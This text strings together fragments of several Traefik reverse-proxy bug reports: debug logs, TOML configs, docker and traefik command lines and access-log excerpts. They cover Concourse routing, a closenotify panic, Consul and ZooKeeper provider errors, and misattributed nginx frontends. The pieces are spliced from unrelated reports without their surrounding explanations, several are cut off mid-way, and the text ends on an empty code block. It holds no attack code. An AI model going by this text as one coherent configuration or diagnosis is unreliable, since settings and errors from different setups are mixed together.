time="2017-12-28t15:26:25z" level=info msg="preparing server http &{network: address::80 tls:<nil> redirect: auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2017-12-28t15:26:25z" level=info msg="preparing server https &{network: address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2017-12-28t15:26:25z" level=info msg="starting server on :80"
time="2017-12-28t15:26:26z" level=info msg="loading acme account..."
time="2017-12-28t15:26:26z" level=info msg="loaded acme config from store /etc/traefik/acme/acme.json"
time="2017-12-28t15:26:26z" level=debug msg="building acme client..."
time="2017-12-28t15:26:26z" level=debug msg=agreetotos...
time="2017-12-28t15:26:27z" level=info msg="preparing server traefik &{network: address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2017-12-28t15:26:27z" level=info msg="starting provider *file.provider {"watch":true,"filename":"//traefik.toml","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"directory":"/config/"}"
time="2017-12-28t15:26:27z" level=info msg="retrieving acme certificates..."
time="2017-12-28t15:26:27z" level=info msg="retrieved acme certificates"
time="2017-12-28t15:26:27z" level=info msg="testing certificate renew..."
time="2017-12-28t15:26:27z" level=info msg="starting server on :443"
time="2017-12-28t15:26:27z" level=info msg="starting server on :8080"
time="2017-12-28t15:26:27z" level=debug msg="validation of load balancer method for backend concourse failed: invalid load-balancing method \'\'
using default method wrr."
time="2017-12-28t15:26:27z" level=debug msg="configuration received from provider file: {"backends":{"concourse":{"servers":{"server1":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}}},"frontends":{"concourse":{"entrypoints":["http","https"],"backend":"concourse","routes":{"test_1":{"rule":"host:concourse.my.example.com"}},"priority":0,"basicauth":null,"headers":{}}}}"
time="2017-12-28t15:26:27z" level=debug msg="creating frontend concourse"
time="2017-12-28t15:26:27z" level=debug msg="wiring frontend concourse to entrypoint http"
time="2017-12-28t15:26:27z" level=debug msg="creating route test_1 host:concourse.my.example.com"
time="2017-12-28t15:26:27z" level=debug msg="creating entrypoint redirect http -> https : ^(?:https?:\\/\\/)?([\\w\\._-]+)(?::\\d+)?(.*)$ -> "
time="2017-12-28t15:26:27z" level=debug msg="creating backend concourse"
time="2017-12-28t15:26:27z" level=debug msg="creating load-balancer wrr"
time="2017-12-28t15:26:27z" level=debug msg="creating server server1 at with weight 0"
time="2017-12-28t15:26:27z" level=debug msg="creating retries max attempts 1"
time="2017-12-28t15:26:27z" level=debug msg="wiring frontend concourse to entrypoint https"
time="2017-12-28t15:26:27z" level=debug msg="creating route test_1 host:concourse.my.example.com"
time="2017-12-28t15:26:27z" level=debug msg="creating backend concourse"
time="2017-12-28t15:26:27z" level=debug msg="creating load-balancer wrr"
time="2017-12-28t15:26:27z" level=debug msg="creating server server1 at with weight 0"
time="2017-12-28t15:26:27z" level=debug msg="creating retries max attempts 1"
time="2017-12-28t15:26:27z" level=info msg="server configuration reloaded on :443"
time="2017-12-28t15:26:27z" level=info msg="server configuration reloaded on :8080"
time="2017-12-28t15:26:27z" level=info msg="server configuration reloaded on :80"
time="2017-12-28t15:26:27z" level=debug msg="loadcertificatefordomains [concourse.my.example.com]..."
time="2017-12-28t15:26:27z" level=debug msg="look for provided certificate to validate [concourse.my.example.com]..."
time="2017-12-28t15:26:27z" level=debug msg="no provided certificate found for domains [concourse.my.example.com], get acme certificate."
time="2017-12-28t15:26:31z" level=debug msg="look for provided certificate to validate [concourse.my.example.com]..."
time="2017-12-28t15:26:31z" level=debug msg="no provided certificate found for domains [concourse.my.example.com], get acme certificate."
time="2017-12-28t15:26:31z" level=debug msg="challenge getcertificate concourse.my.example.com"
time="2017-12-28t15:26:31z" level=debug msg="acme got domain cert concourse.my.example.com"
time="2017-12-28t15:26:31z" level=debug msg="vulcand/oxy/roundrobin/rr: begin servehttp on request" request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/teams/main/pipelines/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["max-age=0"],"cookie":["atc-authorization=\\"bearer sometoken\\""],"dnt":["1"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"concourse.my.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"${my-ip}:53372","requesturi":"/teams/main/pipelines/","tls":null}"
time="2017-12-28t15:26:31z" level=debug msg="vulcand/oxy/roundrobin/rr: forwarding this request to url" forwardurl= request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/teams/main/pipelines/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["max-age=0"],"cookie":["atc-authorization=\\"bearer sometoken\\""],"dnt":["1"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"concourse.my.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"${my-ip}:53372","requesturi":"/teams/main/pipelines/","tls":null}"
time="2017-12-28t15:26:31z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"concourse-web:8080","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["max-age=0"],"cookie":["atc-authorization=\\"bearer sometoken\\""],"dnt":["1"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"concourse.my.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"${my-ip}:53372","requesturi":"/teams/main/pipelines/","tls":null}"
time="2017-12-28t15:26:31z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"concourse-web:8080","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["max-age=0"],"cookie":["atc-authorization=\\"bearer sometoken\\""],"dnt":["1"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"concourse.my.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"${my-ip}:53372","requesturi":"/teams/main/pipelines/","tls":null}"
time="2017-12-28t15:26:31z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"concourse-web:8080","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["max-age=0"],"cookie":["atc-authorization=\\"bearer sometoken\\""],"dnt":["1"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"concourse.my.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"${my-ip}:53372","requesturi":"/teams/main/pipelines/","tls":null}"
time="2017-12-28t15:26:31z" level=debug msg="vulcand/oxy/forward: competed servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"concourse-web:8080","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["max-age=0"],"cookie":["atc-authorization=\\"bearer sometoken\\""],"dnt":["1"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"concourse.my.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"${my-ip}:53372","requesturi":"/teams/main/pipelines/","tls":null}"
time="2017-12-28t15:26:31z" level=debug msg="vulcand/oxy/roundrobin/rr: competed servehttp on request" request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/teams/main/pipelines/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/2.0","protomajor":2,"protominor":0,"header":{"accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"accept-encoding":["gzip, deflate, br"],"accept-language":["en-us,en;q=0.5"],"cache-control":["max-age=0"],"cookie":["atc-authorization=\\"bearer sometoken\\""],"dnt":["1"],"upgrade-insecure-requests":["1"],"user-agent":["mozilla/5.0 (windows nt 10.0; win64; x64; rv:57.0) gecko/20100101 firefox/57.0"]},"contentlength":0,"transferencoding":null,"host":"concourse.my.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"${my-ip}:53372","requesturi":"/teams/main/pipelines/","tls":null}"
time="2017-12-28t15:26:31z" level=error msg="recovered from panic in http handler: interface conversion: *negroni.responsewriter is not http.closenotifier: missing method closenotify" ``` </details>
defaultentrypoints = ["http"] [entrypoints] [entrypoints.http] address = ":8080" compress = true [web] address = ":8585"
``` ```shell
./traefik \\ --debug=true \\ --configfile=config.toml \\ --consulcatalog \\ --consulcatalog.prefix=stage.traefik \\ --consulcatalog.debugloggeneratedtemplate \\ --consulcatalog.exposedbydefault=false \\ --consulcatalog.endpoint=127.0.0.1:8500
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```console
configuration received from provider consul_catalog: {"backends":{"backend-client":{"servers":{"client--172-nn-nn-nn--32873--version-build-v1-6--environment-stage--stage-traefik-backend-loadbalancer-stickiness-cookiename-pin--stage-traefik-backend-loadbalancer-stickiness-true--stage-traefik-frontend-priority-10--stage-traefik-frontend-rule-pathprefix-api--stage-traefik-enable-true--0":{"url":" ","weight":0},"client--172-nn-nn-nn--32874--version-build-v1-6--environment-stage--stage-traefik-backend-loadbalancer-stickiness-cookiename-pin--stage-traefik-backend-loadbalancer-stickiness-true--stage-traefik-frontend-priority-10--stage-traefik-frontend-rule-pathprefix-api--stage-traefik-enable-true--1":{"url":" ","weight":0},"client--172-nn-nn-nn--32875--version-build-v1-6--environment-stage--stage-traefik-backend-loadbalancer-stickiness-cookiename-pin--stage-traefik-backend-loadbalancer-stickiness-true--stage-traefik-frontend-priority-10--stage-traefik-frontend-rule-pathprefix-api--stage-traefik-enable-true--2":{"url":" ","weight":0},"client--172-nn-nn-nn--32876--version-build-v1-6--environment-stage--stage-traefik-backend-loadbalancer-stickiness-cookiename-pin--stage-traefik-backend-loadbalancer-stickiness-true--stage-traefik-frontend-priority-10--stage-traefik-frontend-rule-pathprefix-api--stage-traefik-enable-true--3":{"url":" ","weight":0},"client--172-nn-nn-nn--32877--version-build-v1-6--environment-stage--stage-traefik-backend-loadbalancer-stickiness-cookiename-pin--stage-traefik-backend-loadbalancer-stickiness-true--stage-traefik-frontend-priority-10--stage-traefik-frontend-rule-pathprefix-api--stage-traefik-enable-true--4":{"url":" ","weight":0},"client--172-nn-nn-nn--32878--version-build-v1-6--environment-stage--stage-traefik-backend-loadbalancer-stickiness-cookiename-pin--stage-traefik-backend-loadbalancer-stickiness-true--stage-traefik-frontend-priority-10--stage-traefik-frontend-rule-pathprefix-api--stage-traefik-enable-true--5":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}}}}
debu[2017-12-27t05:21:18z] last consul_catalog config received less than %!s(flaeg.duration=2000000000), waiting...
debu[2017-12-27t05:21:20z] waited for consul_catalog config, ok
debu[2017-12-27t05:21:20z] creating frontend traefik-admin
debu[2017-12-27t05:21:20z] wiring frontend traefik-admin to entrypoint http
debu[2017-12-27t05:21:20z] creating load-balancer wrr
debu[2017-12-27t05:21:20z] creating server server1 at with weight 10
debu[2017-12-27t05:21:20z] creating frontend frontend-client
debu[2017-12-27t05:21:20z] wiring frontend frontend-client to entrypoint http
debu[2017-12-27t05:21:20z] creating route route-host-client pathprefix:/api
debu[2017-12-27t05:21:20z] creating backend backend-client
debu[2017-12-27t05:21:20z] creating load-balancer wrr
``` (sanitized...)
using docker 17.06-ce in swarm mode arguments
``` bash --debug --web --docker.swarmmode --docker.domain=localhost --docker.watch --insecureskipverify --docker.endpoint=unix://var/run/docker.sock -c /traefik.toml -l debug
``` toml ```toml
defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "<removed>" keyfile = "<removed>"
``` docker compose labels
``` yaml labels: - "traefik.port=80" - "traefik.frontend.rule=pathprefix: <removed>" - "traefik.docker.network=<removed>"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) traefik's logs don't seem to be of much help, the best clue i can find are lines where it completes a request to a valid url with a 0 length message: ```shell
kds_traefik.1.ixhcsuyq884t@<removed> | time="2017-12-19t17:04:59z" level=debug msg="vulcand/oxy/forward: competed servehttp on request" request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"<removed>","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"cache-control":["max-age=0"],"user-agent":["debian apt-http/1.3 (1.4.6)"]},"contentlength":0,"transferencoding":null,"host":"<removed>","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"<removed>","requesturi":"<removed>/ubuntu/dists/zesty/universe/binary-amd64/packages.gz","tls":null}" ```
docker version:
client: version: 17.09.1-ce api version: 1.32 go version: go1.8.3 git commit: 19e2cf6 built: thu dec 7 22:22:25 2017 os/arch: darwin/amd64 server: version: 17.09.1-ce api version: 1.32 (minimum version 1.12) go version: go1.8.3 git commit: 19e2cf6 built: thu dec 7 22:28:28 2017 os/arch: linux/amd64 experimental: true
``` ```toml
debug = true
loglevel = "info" defaultentrypoints = ["http"]
[entrypoints] [entrypoints.http] address = ":80" compress = true [api] dashboard = true [docker] endpoint = "unix:///var/run/docker.sock"
watch = true
exposedbydefault = false
swarmmode = true
### if applicable, please paste the log output in debug mode (`--debug` switch) ```
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:05z" level=debug msg="configuration received from provider docker: {"backends":{"backend-whoami0":{"servers":{"server-whoami0-1":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend-host-gigi-docker-localhost-0":{"entrypoints":["http"],"backend":"backend-whoami0","routes":{"route-frontend-host-gigi-docker-localhost-0":{"rule":"host:gigi.docker.localhost"}},"passhostheader":true,"priority":0,"basicauth":[],"headers":{}}}}"
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:05z" level=info msg="skipping same configuration for provider docker"
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:20z" level=debug msg="filtering disabled container gatekeeper_consul.1"
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:20z" level=debug msg="filtering disabled container gatekeeper_traefik.1"
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:20z" level=debug msg="could not load traefik.frontend.whitelistsourcerange labels"
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:20z" level=debug msg="could not load traefik.frontend.entrypoints labels"
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:20z" level=debug msg="could not load traefik.frontend.auth.basic labels"
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:20z" level=debug msg="validation of load balancer method for backend backend-whoami0 failed: invalid load-balancing method \'\'
using default method wrr."
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:20z" level=debug msg="configuration received from provider docker: {"backends":{"backend-whoami0":{"servers":{"server-whoami0-1":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend-host-gigi-docker-localhost-0":{"entrypoints":["http"],"backend":"backend-whoami0","routes":{"route-frontend-host-gigi-docker-localhost-0":{"rule":"host:gigi.docker.localhost"}},"passhostheader":true,"priority":0,"basicauth":[],"headers":{}}}}"
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:20z" level=info msg="skipping same configuration for provider docker"
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:35z" level=debug msg="filtering disabled container gatekeeper_consul.1"
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:35z" level=debug msg="filtering disabled container gatekeeper_traefik.1"
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:35z" level=debug msg="could not load traefik.frontend.whitelistsourcerange labels"
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:35z" level=debug msg="could not load traefik.frontend.entrypoints labels"
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:35z" level=debug msg="could not load traefik.frontend.auth.basic labels"
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:35z" level=debug msg="validation of load balancer method for backend backend-whoami0 failed: invalid load-balancing method \'\'
using default method wrr."
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:35z" level=debug msg="configuration received from provider docker: {"backends":{"backend-whoami0":{"servers":{"server-whoami0-1":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend-host-gigi-docker-localhost-0":{"entrypoints":["http"],"backend":"backend-whoami0","routes":{"route-frontend-host-gigi-docker-localhost-0":{"rule":"host:gigi.docker.localhost"}},"passhostheader":true,"priority":0,"basicauth":[],"headers":{}}}}"
gatekeeper_traefik.1.oknygyzd99ro@moby | time="2017-12-18t00:48:35z" level=info msg="skipping same configuration for provider docker" ``` to test this, with traefik running as service connected on `cassiny-public`
using dockerpy ```python
service_labels = { "traefik.port": "80", "traefik.enable": "true", "traefik.frontend.rule": "host:pinco.docker.localhost", "traefik.docker.network": "cassiny-public",
} client.services.create("emilevauge/whoami", name="whoami1", networks=["cassiny-public"], labels=service_labels)
``` docker cli
docker service create \\
--name whoami0 \\
--label traefik.port=80 \\
--label traefik.enable=true \\
--label traefik.frontend.rule="host:gigi.docker.localhost" \\
--label traefik.docker.network="cassiny-public" \\
--network=cassiny-public \\
emilevauge/whoami
``` <img width="1181" alt="screen shot 2017-12-18 at 01 54 01" src=" "> <img width="536" alt="screen shot 2017-12-18 at 02 01 49 1" src=" "> <img width="505" alt="screen shot 2017-12-18 at 02 01 40" src=" ">
defaultentrypoints = ["http", "https"]
loglevel = "error" [web]
address = ":8080" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls] [zookeeper]
prefix = "traefik"
endpoint = "zk-svc.zoo.svc.cluster.local:2181" [acme]
acmelogging = true
email = "redacted@redacted.com"
storage = "traefik/acme/account"
entrypoint = "https"
onhostrule = true
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
2017/12/16 14:32:27 connected to 10.35.240.104:2181
2017/12/16 14:32:27 authenticated: id=171218898434523140, timeout=30000
2017/12/16 14:32:27 re-submitting `0` credentials after reconnect
2017/12/16 14:32:29 structs.go:21: connected to 10.35.240.104:2181
2017/12/16 14:32:29 structs.go:21: authenticated: id=99161304399151114, timeout=30000
2017/12/16 14:32:29 structs.go:21: re-submitting `0` credentials after reconnect
time="2017-12-16t14:32:29z" level=error msg="error in watch datastore: 1 error(s) decoding: * \'lock\' expected type \'string\', got unconvertible type \'map[string]interface {}\', retrying in 275.180674ms"
time="2017-12-16t14:32:52z" level=error msg="datastore sync error: object lock value: expected dac71c66-ed7e-469d-b665-cfe75928f1fc, got d2f20a7e-4ceb-4ecc-8154-d0ab4fd291ad, retrying in 622.310789ms"
time="2017-12-16t14:32:52z" level=error msg="error reloading: 1 error(s) decoding: * \'lock\' expected type \'string\', got unconvertible type \'map[string]interface {}\'"
time="2017-12-16t14:32:52z" level=error msg="error in watch datastore: 1 error(s) decoding: * \'lock\' expected type \'string\', got unconvertible type \'map[string]interface {}\', retrying in 944.68671ms"
time="2017-12-16t14:32:52z" level=error msg="datastore sync error: object lock value: expected dac71c66-ed7e-469d-b665-cfe75928f1fc, got d2f20a7e-4ceb-4ecc-8154-d0ab4fd291ad, retrying in 813.336721ms"
time="2017-12-16t14:32:52z" level=error msg="error reloading: 1 error(s) decoding: * \'lock\' expected type \'string\', got unconvertible type \'map[string]interface {}\'"
time="2017-12-16t14:32:53z" level=error msg="datastore sync error: object lock value: expected dac71c66-ed7e-469d-b665-cfe75928f1fc, got d2f20a7e-4ceb-4ecc-8154-d0ab4fd291ad, retrying in 1.428848423s"
time="2017-12-16t14:32:53z" level=error msg="error reloading: 1 error(s) decoding: * \'lock\' expected type \'string\', got unconvertible type \'map[string]interface {}\'"
time="2017-12-16t14:32:54z" level=error msg="datastore sync error: object lock value: expected dac71c66-ed7e-469d-b665-cfe75928f1fc, got d2f20a7e-4ceb-4ecc-8154-d0ab4fd291ad, retrying in 1.293795923s"
time="2017-12-16t14:32:54z" level=error msg="error reloading: 1 error(s) decoding: * \'lock\' expected type \'string\', got unconvertible type \'map[string]interface {}\'"
time="2017-12-16t14:32:56z" level=error msg="datastore sync error: object lock value: expected dac71c66-ed7e-469d-b665-cfe75928f1fc, got d2f20a7e-4ceb-4ecc-8154-d0ab4fd291ad, retrying in 2.001361005s"
time="2017-12-16t14:32:56z" level=error msg="error reloading: 1 error(s) decoding: * \'lock\' expected type \'string\', got unconvertible type \'map[string]interface {}\'"
time="2017-12-16t14:32:58z" level=error msg="datastore sync error: object lock value: expected dac71c66-ed7e-469d-b665-cfe75928f1fc, got d2f20a7e-4ceb-4ecc-8154-d0ab4fd291ad, retrying in 3.608725988s"
time="2017-12-16t14:32:58z" level=error msg="error reloading: 1 error(s) decoding: * \'lock\' expected type \'string\', got unconvertible type \'map[string]interface {}\'"
time="2017-12-16t14:33:01z" level=error msg="datastore sync error: object lock value: expected dac71c66-ed7e-469d-b665-cfe75928f1fc, got d2f20a7e-4ceb-4ecc-8154-d0ab4fd291ad, retrying in 4.110356531s"
time="2017-12-16t14:33:01z" level=error msg="error reloading: 1 error(s) decoding: * \'lock\' expected type \'string\', got unconvertible type \'map[string]interface {}\'"
time="2017-12-16t14:33:06z" level=error msg="datastore sync error: object lock value: expected dac71c66-ed7e-469d-b665-cfe75928f1fc, got d2f20a7e-4ceb-4ecc-8154-d0ab4fd291ad, retrying in 6.627829011s"
time="2017-12-16t14:33:06z" level=error msg="error reloading: 1 error(s) decoding: * \'lock\' expected type \'string\', got unconvertible type \'map[string]interface {}\'"
time="2017-12-16t14:33:12z" level=error msg="datastore sync error: object lock value: expected dac71c66-ed7e-469d-b665-cfe75928f1fc, got d2f20a7e-4ceb-4ecc-8154-d0ab4fd291ad, retrying in 17.656291998s"
time="2017-12-16t14:33:12z" level=error msg="error reloading: 1 error(s) decoding: * \'lock\' expected type \'string\', got unconvertible type \'map[string]interface {}\'"
time="2017-12-16t14:33:30z" level=error msg="datastore sync error: object lock value: expected dac71c66-ed7e-469d-b665-cfe75928f1fc, got d2f20a7e-4ceb-4ecc-8154-d0ab4fd291ad, retrying in 23.350973386s"
time="2017-12-16t14:33:30z" level=error msg="error reloading: 1 error(s) decoding: * \'lock\' expected type \'string\', got unconvertible type \'map[string]interface {}\'"
time="2017-12-16t14:33:37z" level=error msg="error in watch datastore: 1 error(s) decoding: * \'lock\' expected type \'string\', got unconvertible type \'map[string]interface {}\', retrying in 704.597817ms" time="2017-12-16t14:33:53z" level=error msg="error calling leadership listener: datastore cannot sync: object lock value: expected dac71c66-ed7e-469d-b665-cfe75928f1fc, got d2f20a7e-4ceb-4ecc-8154-d0ab4fd291ad"
the route to concourse was configured statically.
################################################################
# global configuration
################################################################ loglevel = "debug" # traefik logs file
traefiklogsfile = "/var/log/traefik-debug.log" # access logs file
accesslogsfile = "/var/log/accesstraefik.log" # entrypoints
defaultentrypoints = ["http", "https"]
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "" keyfile = "" # ..
[file] [backends] [backends.concourse] [backends.concourse.servers.server1] url = " "
[frontends] [frontends.concourse] backend = "concourse" passhostheader = true [frontends.concourse.routes.host] rule = "host:some-host"
### if applicable, please paste the log output in debug mode (`--debug` switch) only these lines are related to concourse in traefik logs
time="2017-12-15t22:13:12z" level=debug msg="round trip: code: 200, duration: 6.000457ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:some-host"
time="2017-12-15t22:13:14z" level=debug msg="round trip: code: 200, duration: 2.51749ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:some-host"
time="2017-12-15t22:13:14z" level=debug msg="round trip: code: 200, duration: 3.597858ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:some-host"
defaultentrypoints = ["http", "https"]
loglevel = "error"
insecureskipverify = true [accesslog]
filepath = "/var/log/traefik/access.log" ################################################################
# web configuration backend
################################################################
address = ":8080"
[web.statistics]
recenterrors = 20 ################################################################
# docker configuration backend
################################################################
domain = "test.tld"
watch = true [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":8443"
``` traefik run with: ```
docker rm -fv traefik; docker run --detach \\ --name traefik \\ --publish 8080:8080 \\ --publish 8880:80 \\ --publish 8443:443 \\ --volume /users/jdel/data/traefik/logs/:/var/log/traefik/:rw \\ --volume /users/jdel/data/traefik/traefik.toml:/etc/traefik/traefik.toml:ro \\ --volume /var/run/docker.sock:/var/run/docker.sock:ro \\ --memory 300m \\ traefik:v1.4 --web
``` now run 3 nginx: ```
docker run -d --name nginx1 nginx:stable-alpine
docker run -d --name nginx2 nginx:stable-alpine
docker run -d --name nginx3 nginx:stable-alpine
``` a single curl on nginx1 generates 2 lines in the access log: ```
172.17.0.1 - - [13/dec/2017:19:49:27 +0000] "get / http/1.1" - - - "curl/7.54.0" 33 "host-nginx1-test-tld-3" - 0ms
172.17.0.1 - - [13/dec/2017:19:49:27 +0000] "get / http/1.1" 200 612 - "curl/7.54.0" 34 "host-nginx1-test-tld-3" " " 0ms
``` now a curl on nginx2 shows a weird behaviour: ```
172.17.0.1 - - [13/dec/2017:19:50:41 +0000] "get / http/1.1" - - - "curl/7.54.0" 41 "host-nginx1-test-tld-3" - 0ms
172.17.0.1 - - [13/dec/2017:19:50:41 +0000] "get / http/1.1" 200 612 - "curl/7.54.0" 42 "host-nginx2-test-tld-2" " " 0ms
``` the first lime says we're hitting `host-nginx1-test-tld-3` which is not correct
same goes with nginx3: ```
172.17.0.1 - - [13/dec/2017:19:52:07 +0000] "get / http/1.1" - - - "curl/7.54.0" 43 "host-nginx1-test-tld-3" - 0ms
172.17.0.1 - - [13/dec/2017:19:52:07 +0000] "get / http/1.1" 200 612 - "curl/7.54.0" 44 "host-nginx3-test-tld-1" " " 0ms
- 3 nodes cluster with rr dns for the record i'm trying to get a certificate for
- traefik is running as a docker swarm service on this 3 nodes cluster
- traefik is getting its configuration from a consul cluster (and thus, storing his ssl certificates in consul too)
- i tried 2 different swarm modes for running traefik (both result in this segfault) - `global` mode, with a 3 node cluster so 3 traefik instance - ..
but being afraid that this could cause the troubles i had with the challenge (the rr dns would cause the challenge resolution to potentially be requested to another traefik instance than the one that initiated it, even if they might be able to still resolve it since they're storing everything in consul), i ended up running it in `replicated` mode with a single replica `traefik.toml` that has been stored in consul through `traefik storeconfig` (hit btw): ```toml
debug = true
loglevel = "debug"
defaultentrypoints = ["http", "https"] [acme]
email = "foobar@example.org"
storage = "/root/acme.json" # or "traefik/acme/account" if using kv store
entrypoint = "https"
acmelogging = true
ondemand = true
onhostrule = true [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [web]
address = ":8080"
readonly = true [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "example.work"
watch = true
swarmmode = true
exposedbydefault = false [consul]
endpoint = "consul.example.org:8500"
watch = true
prefix = "traefik"
``` `docker-compose.yml` used to spawn the service: ```yml
